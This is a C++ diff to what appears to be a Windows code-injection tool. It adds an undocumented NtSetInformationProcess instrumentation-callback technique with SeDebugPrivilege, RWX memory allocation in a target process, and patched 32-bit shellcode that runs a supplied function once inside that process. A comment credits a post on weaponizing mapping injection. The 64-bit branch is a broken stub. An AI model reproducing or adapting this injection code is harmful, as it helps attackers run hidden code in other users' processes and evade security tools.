@@ -3,6 +3,7 @@
 #include <memory>
 #include <iostream>
 #include "Common.h"
+#include "UndocumentedData.h"
 
 class IProcessAccess
 {
@@ -29,6 +30,8 @@ public:
     /// <param name="threadId"></param>
     /// <returns>Handle to the thread</returns>
     virtual HANDLE CreateThread(void* addr, void* param, DWORD flag, DWORD& threadId) = 0;
+
+    virtual void SetProcessInstrumentCallback(void* target) = 0;
 };
 
 class HandleProcessAccess : public IProcessAccess
@@ -74,6 +77,47 @@ public:
         return ret;
     }
 
+    virtual void SetProcessInstrumentCallback(void* target)
+    {
+        if (Common::SetPrivilege(L"SeDebugPrivilege", true))
+        {
+            Common::Print("[+] DebugPrivilege set.");
+        }
+        else
+        {
+            Common::Print("[!] Set privilege failed(Did you run this program under administration right?)");
+        }
+
+#ifdef _WIN64
+        bool is64 = true;
+#else
+        bool is64 = false;
+#endif
+        DWORD winVer = 0;
+        Common::GetWindowsVersion(winVer);
+        if (winVer >= 10)
+        {
+            PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION_EX info = {};
+            info.Callback = target;
+            info.Version = is64 ? 0 : 1;
+            auto ret = NtSetInformationProcess(handle, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback, &info, sizeof(info));
+            if (ret != 0)
+            {
+                Common::ThrowException("NtSetInformationProcess failed with %d, last error: %d", ret, GetLastError());
+            }
+        }
+        else
+        {
+            PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION info = {};
+            info.Callback = target;
+            auto ret = NtSetInformationProcess(handle, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback, &info, sizeof(info));
+            if (ret != 0)
+            {
+                Common::ThrowException("NtSetInformationProcess failed with %d, last error: %d", ret, GetLastError());
+            }
+        }
+    }
+
     HandleProcessAccess(HANDLE handle)
     {
         this->handle = handle;
@@ -111,6 +155,11 @@ public:
     virtual HANDLE CreateThread(void* addr, void* param, DWORD flag, DWORD& threadId) override
     {
         return NULL;
+    }
+
+    virtual void SetProcessInstrumentCallback(void* target) override
+    {
+        return;
     }
 
     KernelProcessAccess()
@@ -268,23 +317,24 @@ private:
     void* parameter = NULL;
 };
 
+// See https://splintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html
 class InstrumentCallbackExecuter : public IExecuter
 {
 public:
     virtual void Go() override
     {
-        ;
+        access->SetProcessInstrumentCallback(realEntryPoint);
     }
 
     void Prepare(void* startAddr, void* parameter)
     {
         this->startAddr = startAddr;
         this->parameter = parameter;
-
-
-        
-
-
+        auto base = access->AllocateMemory(0, sizeof(shellcode), PAGE_EXECUTE_READWRITE);
+        FixShellcode(base, startAddr, parameter);
+        SIZE_T bytesWritten = 0;
+        access->WriteMemory(base, std::vector<BYTE>(&shellcode[0], &shellcode[sizeof(shellcode)]), bytesWritten);
+        realEntryPoint = base;
     }
 
     InstrumentCallbackExecuter(IProcessAccess* access)
@@ -296,10 +346,42 @@ private:
     IProcessAccess* access = NULL;
     void* startAddr = NULL;
     void* parameter = NULL;
+    void* realEntryPoint = NULL;
 
+#ifdef _WIN64
+    inline static BYTE shellcode[] = { 0x90 };
 
-    inline static BYTE shellcode[] = { 0x90 };
-    inline static BYTE shellcode[] = { 0x90 };
+    void FixShellcode(void* base)
+    {
+        ;
+    }
+#else
+    //    0:  60                      pusha
+    //    1 : 9c                      pushf
+    //    2 : b8 01 00 00 00          mov    eax, 0x1
+    //    7 : f0 0f c0 05 aa aa aa    lock xadd BYTE PTR ds : 0xaaaaaaaa, al
+    //    e : aa
+    //    f : 83 f8 00                cmp    eax, 0x0
+    //    12 : 75 13                   jne    27 < exit >
+    //    14 : 83 ec 40                sub    esp, 0x40
+    //    17 : b8 bb bb bb bb          mov    eax, 0xbbbbbbbb
+    //    1c : 50                      push   eax
+    //    1d : b8 cc cc cc cc          mov    eax, 0xcccccccc
+    //    22 : ff d0                   call   eax
+    //    24 : 83 c4 40                add    esp, 0x40
+    //    00000027 < exit > :
+    //    27 : 9d                      popf
+    //    28 : 61                      popa
+    //    29 : ff e1                   jmp    ecx
+    //    2b : 00                      db '0'
+    inline static BYTE shellcode[] = { 0x60, 0x9C, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xC0, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x83, 0xF8, 0x00, 0x75, 0x13, 0x83, 0xEC, 0x40, 0xB8, 0xBB, 0xBB, 0xBB, 0xBB, 0x50, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0xD0, 0x83, 0xC4, 0x40, 0x9D, 0x61, 0xFF, 0xE1, 0x00 };
+    void FixShellcode(void* base, void* target, void* param)
+    {
+        *(DWORD*)(&shellcode[11]) = (DWORD)base + 0x2b;
+        *(DWORD*)(&shellcode[0x18]) = (DWORD)param;
+        *(DWORD*)(&shellcode[0x1e]) = (DWORD)target;
+    }
+#endif
 };
 
 
